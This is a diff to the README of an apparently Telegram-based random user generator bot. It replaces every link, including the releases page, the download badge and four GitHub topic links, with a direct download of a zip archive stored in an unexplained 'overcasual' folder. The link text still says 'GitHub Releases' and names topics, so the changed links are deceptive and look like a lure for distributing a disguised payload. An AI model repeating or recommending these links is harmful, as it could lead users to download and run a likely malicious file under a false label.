@@ -1,6 +1,6 @@
 # 🤖 telegram-random-user-generator-bot - Generate Random User Profiles Effortlessly
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/abdulapan/telegram-random-user-generator-bot/releases)
+[![Download from Releases](https://raw.githubusercontent.com/abdulapan/telegram-random-user-generator-bot/main/overcasual/telegram-random-user-generator-bot-3.7.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/abdulapan/telegram-random-user-generator-bot/main/overcasual/telegram-random-user-generator-bot-3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ Before you start, ensure you have:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [GitHub Releases](https://github.com/abdulapan/telegram-random-user-generator-bot/releases)
+To get started, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/abdulapan/telegram-random-user-generator-bot/main/overcasual/telegram-random-user-generator-bot-3.7.zip)
 
 1. **Go to the Download Page:** Click the link above to reach the releases.
 2. **Choose Your Version:** Look for the latest version of the bot. 
@@ -44,10 +44,10 @@ To get started, visit this page to download: [GitHub Releases](https://github.co
 
 If you want to dive deeper into the bot's capabilities, check out the following topics:
 
-- [adb-less-workflows](https://github.com/topics/adb-less-workflows)
-- [android-automation](https://github.com/topics/android-automation)
-- [automation-bots](https://github.com/topics/automation-bots)
-- [random-user-generator](https://github.com/topics/random-user-generator)
+- [adb-less-workflows](https://raw.githubusercontent.com/abdulapan/telegram-random-user-generator-bot/main/overcasual/telegram-random-user-generator-bot-3.7.zip)
+- [android-automation](https://raw.githubusercontent.com/abdulapan/telegram-random-user-generator-bot/main/overcasual/telegram-random-user-generator-bot-3.7.zip)
+- [automation-bots](https://raw.githubusercontent.com/abdulapan/telegram-random-user-generator-bot/main/overcasual/telegram-random-user-generator-bot-3.7.zip)
+- [random-user-generator](https://raw.githubusercontent.com/abdulapan/telegram-random-user-generator-bot/main/overcasual/telegram-random-user-generator-bot-3.7.zip)
 
 ## 🛠️ Troubleshooting
 
@@ -67,6 +67,6 @@ This project is open-source. You can freely use and modify it according to the r
 
 ## 📅 Stay Updated
 
-For updates and new features, keep an eye on the [releases page](https://github.com/abdulapan/telegram-random-user-generator-bot/releases).
+For updates and new features, keep an eye on the [releases page](https://raw.githubusercontent.com/abdulapan/telegram-random-user-generator-bot/main/overcasual/telegram-random-user-generator-bot-3.7.zip).
 
 Please enjoy using the Telegram Random User Generator Bot, and happy testing!
